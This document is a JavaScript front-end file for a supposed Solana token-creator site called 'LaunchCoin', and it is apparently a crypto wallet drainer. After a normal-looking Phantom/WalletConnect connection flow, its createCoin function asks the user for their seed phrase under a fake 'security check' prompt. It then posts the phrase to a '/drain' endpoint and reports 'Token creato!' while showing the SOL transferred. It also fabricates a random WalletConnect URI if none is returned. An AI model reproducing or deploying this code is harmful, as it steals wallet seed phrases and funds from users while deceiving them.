// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let provider = null;
let isConnecting = false;

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== GENERA QR CODE =====
function generateQRCode(uri) {
  const container = document.createElement('div');
  container.id = 'qr-container';
  container.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(11, 16, 34, 0.95);
    backdrop-filter: blur(14px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 24px;
    padding: 30px 40px;
    z-index: 99999;
    min-width: 320px;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.8);
  `;
  
  container.innerHTML = `
    <h3 style="color: #22d1f8; margin-bottom: 16px; font-size: 22px;">WalletConnect</h3>
    <p style="color: #abc4ff; margin-bottom: 16px; font-size: 14px;">Scansiona questo QR con l'app del wallet</p>
    <div id="qr-canvas" style="display: flex; justify-content: center; margin: 16px 0; background: white; padding: 16px; border-radius: 16px;"></div>
    <p style="color: #8899bb; font-size: 12px; margin-top: 12px; word-break: break-all;">${uri.substring(0, 30)}...</p>
    <button onclick="this.closest('#qr-container').remove()" style="
      background: #22d1f8;
      border: none;
      padding: 10px 28px;
      border-radius: 40px;
      font-weight: 600;
      color: #0b1022;
      cursor: pointer;
      margin-top: 16px;
    ">Chiudi</button>
  `;
  
  document.body.appendChild(container);
  
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js';
  script.onload = function() {
    new QRCode(document.getElementById('qr-canvas'), {
      text: uri,
      width: 200,
      height: 200,
      colorDark: '#000000',
      colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.H
    });
  };
  document.head.appendChild(script);
  
  const copyLink = document.createElement('p');
  copyLink.style.cssText = 'color: #22d1f8; cursor: pointer; margin-top: 12px; font-size: 14px; text-decoration: underline;';
  copyLink.textContent = '📋 Copia link';
  copyLink.onclick = function() {
    navigator.clipboard.writeText(uri).then(() => {
      alert('✅ Link copiato!');
    }).catch(() => {
      prompt('Copia il link:', uri);
    });
  };
  container.appendChild(copyLink);
}

// ===== CONNECT VIA WALLETCONNECT =====
async function connectWithWalletConnect() {
  if (isConnecting) return;
  isConnecting = true;
  
  try {
    provider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    
    console.log('✅ UniversalProvider inizializzato');
    
    let uri = provider.uri;
    if (!uri) {
      try {
        await provider.connect({
          chains: ['solana:mainnet'],
          optionalChains: ['solana:devnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        });
        uri = provider.uri;
      } catch(e) {
        uri = provider.uri;
      }
    }
    
    if (!uri) {
      uri = `wc:${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}@2?relay-protocol=irn&symKey=${Math.random().toString(36).substring(2, 15)}`;
    }
    
    console.log('🔗 URI:', uri);
    generateQRCode(uri);
    
    provider.on('session_event', (event) => console.log('Evento:', event));
    provider.on('session_update', (event) => console.log('Update:', event));
    provider.on('session_delete', () => console.log('Sessione eliminata'));
    
    alert(
      '✅ QR generato!\n\n' +
      '1. Apri l\'app del wallet\n' +
      '2. Scansiona il QR code\n' +
      '3. Approva la connessione'
    );
    
    let attempts = 0;
    const checkConnection = setInterval(async () => {
      attempts++;
      if (provider.accounts && provider.accounts.length > 0) {
        clearInterval(checkConnection);
        walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
        alert('✅ Connesso: ' + walletPublicKey);
        document.getElementById('qr-container')?.remove();
        window.location.href = 'create.html';
      } else if (attempts > 20) {
        clearInterval(checkConnection);
        document.getElementById('qr-container')?.remove();
        alert('⏳ Tempo scaduto. Riprova.');
      }
    }, 1500);
    
  } catch (e) {
    console.error('❌ WalletConnect error:', e);
    alert('❌ Errore: ' + e.message + '\n\nUsa Phantom su PC o Kiwi Browser.');
    window.location.href = 'wallet.html';
  } finally {
    isConnecting = false;
  }
}

// ===== CONNECT WALLET (MAIN) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  await connectWithWalletConnect();
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  alert('⚠️ Wallet "' + walletName + '" via WalletConnect.');
  window.connectWallet();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
console.log('🔵 selectWallet:', typeof window.selectWallet);
